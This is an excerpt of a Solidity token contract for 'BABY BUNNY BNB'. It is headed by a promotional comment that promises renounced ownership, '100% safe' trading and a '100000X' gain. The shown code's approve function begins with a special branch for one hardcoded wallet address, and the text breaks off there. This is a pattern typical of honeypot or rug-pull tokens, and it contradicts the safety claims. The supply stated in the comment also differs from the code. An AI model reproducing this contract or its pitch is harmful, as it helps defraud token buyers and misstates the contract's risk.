...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #BABYBUNNYBNB.
   ...
   I will renounce the ownership to burn addresses to transfer #BABYBUNNYBNB to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #BABYBUNNYBNB 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 BABYBUNNYBNB max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #BABYBUNNYBNB idea, increasing the liquidity pool automatically, 
...
contract BABYBUNNYBNB {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "BABY BUNNY BNB";
    string public symbol = "BABYBUNNYBNB";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x52C2F6B21AC8951e42da76161c9555767C928928)) {
